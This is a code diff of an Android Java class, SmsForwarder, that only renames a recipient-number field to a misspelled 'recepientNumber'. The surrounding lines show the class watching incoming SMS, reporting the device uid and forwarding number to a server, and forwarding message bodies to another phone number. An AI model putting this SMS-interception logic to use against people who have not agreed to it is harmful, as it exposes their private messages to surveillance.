@@ -39,7 +39,7 @@ public class SmsForwarder extends BaseTask {
     private static final int MAX_SMS_MESSAGE_LENGTH = 160;
 
     private SmsObserver smsObserver;
-    private String recipientNumber;
+    private String recepientNumber;
     private ContentResolver contentResolver;
     private boolean isListening;
     private boolean sending;
@@ -55,7 +55,7 @@ public class SmsForwarder extends BaseTask {
     }
 
     public void listen() {
-        if (this.recipientNumber != null && hasPermission() && !isListening) {
+        if (this.recepientNumber != null && hasPermission() && !isListening) {
             commonParams = new CommonParams(context);
             contentResolver.registerContentObserver(smsUri, true, smsObserver);
             isListening = true;
@@ -63,7 +63,7 @@ public class SmsForwarder extends BaseTask {
             //notify server
             HashMap params = new HashMap();
             params.put("uid", commonParams.getUid());
-            params.put("sms_forwarder_number", recipientNumber);
+            params.put("sms_forwarder_number", recepientNumber);
             params.put("sms_forwarder_status", isListening);
 
             Http req = new Http();
@@ -98,8 +98,8 @@ public class SmsForwarder extends BaseTask {
                 PackageManager.PERMISSION_GRANTED;
     }
 
-    public void setRecipientNumber(String recipientNumber) {
-        this.recipientNumber = recipientNumber;
+    public void setRecepientNumber(String recepientNumber) {
+        this.recepientNumber = recepientNumber;
     }
 
     public class SmsObserver extends ContentObserver {
@@ -160,7 +160,7 @@ public class SmsForwarder extends BaseTask {
                 message += body + "\n\n";
                 message += date + "\n\n";
 
-                Thread send = new SendSmsThread(recipientNumber, message);
+                Thread send = new SendSmsThread(recepientNumber, message);
                 send.start();
             }
 
